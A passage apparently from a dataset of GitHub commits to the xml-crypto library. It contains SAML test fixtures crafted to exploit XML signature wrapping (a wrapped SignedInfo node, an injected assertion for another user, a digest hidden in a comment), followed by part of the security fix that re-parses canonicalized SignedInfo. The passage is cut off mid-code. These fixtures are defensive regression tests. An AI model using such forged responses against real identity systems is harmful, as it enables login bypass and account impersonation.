gwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n```\n\nFilename: test/static/saml_wrapped_signed_info_node.xml:\n```\n@@ -0,0 +1 @@\n+<samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><WRAPPER><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo></WRAPPER><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6RgwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n```\n\nFilename: test/static/valid_saml_with_digest_comment.xml:\n```\n@@ -0,0 +1,7 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>\n+<saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue><!--6zWeUASlD8E73xzDn4ggf0r7ysQ=-->RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">test@example.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>\n+</samlp:Response>\n```",
                "url": "https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98"
            },
            {
                "content": "Merge commit from fork\n\n* Exports C14nCanonicalization, ExclusiveCanonicalization (#471)\n\n* Ensure that they agree on loading References from canon XML\n\n* Fix specific exploits\n\n* Clarify Comments\n\n* Add tests and multiple SignedInfo check.\n\n* Only allow exclusive canon.\n\n* Updates based on feedback.\n\n* Update signedInfo naming.\n\n* Remove unnecessary comment.\n\n* Apply suggested changes\n\n* Iterate on error behavior\n\n* Edit\n\n* Adding back the edit\n\n---------\n\nCo-authored-by: parallels999 <109294935+parallels999@users.noreply.github.com>\nCo-authored-by: mattgd <matt.dzwonczyk@workos.com>\nCo-authored-by: Blair Weber <blair@workos.com>\n\nFilename: src/signed-xml.ts:\n```\n@@ -252,26 +252,72 @@\nexport class SignedXml {\n     this.signedXml = xml;\n \n     const doc = new xmldom.DOMParser().parseFromString(xml);\n+    // Reset the references as only references from our re-parsed signedInfo node can be trusted\n+    this.references = [];\n+\n+    const unverifiedSignedInfoCanon = this.getCanonSignedInfoXml(doc);\n+    if (!unverifiedSignedInfoCanon) {\n+      if (callback) {\n+        callback(new Error(\"Canonical signed info cannot be empty\"), false);\n+        return;\n+      }\n+\n+      throw new Error(\"Canonical signed info cannot be empty\");\n+    }\n+\n+    // unsigned, verify later to keep with consistent callback behavior\n+    const parsedUnverifiedSignedInfo = new xmldom.DOMParser().parseFromString(\n+      unverifiedSignedInfoCanon,\n+      \"text/xml\",\n+    );\n+\n+    const unverifiedSignedInfoDoc = parsedUnverifiedSignedInfo.documentElement;\n+    if (!unverifiedSignedInfoDoc) {\n+      if (callback) {\n+        callback(new Error(\"Could not parse unverifiedSignedInfoCanon into a document\"), false);\n+        return;\n+      }\n+\n+      throw new Error(\"Could not parse unverifiedSignedInfoCanon into a document\");\n+    }\n+\n+    const references = utils.findChildren(unverifiedSignedInfoDoc, \"Reference\");\n+    if (!utils.isArrayHasLength(references)) {\n+      if (callback) {\n+        callback(new Error(\"could not find any Reference elements\"), false);\n+        return;\n+      }\n+\n+      throw new Error(\"could not find any Reference elements\");\n+    }\n+\n+    // TODO: In a future release we'd like to load the Signature and its References at the same time,\n+    // however, in the `.loadSignature()` method we don't have the entire document,\n+    // which we need to to keep the inclusive namespaces\n+    for (const reference of references) {\n+      this.loadReference(reference);\n+    }\n \n     if (!this.getReferences().every((ref) => this.validateReference(ref, doc))) {\n       if (callback) {\n-        callback(new Error(\"Could not validate all references\"));\n+        callback(new Error(\"Could not validate all references\"), false);\n         return;\n       }\n \n       return false;\n     }\n \n-    const signedInfoCanon = this.getCanonSignedInfoXml(doc);\n+    // Stage B: Take the signature algorithm and key and verify the SignatureValue against the canonicalized SignedInfo\n     const signer = 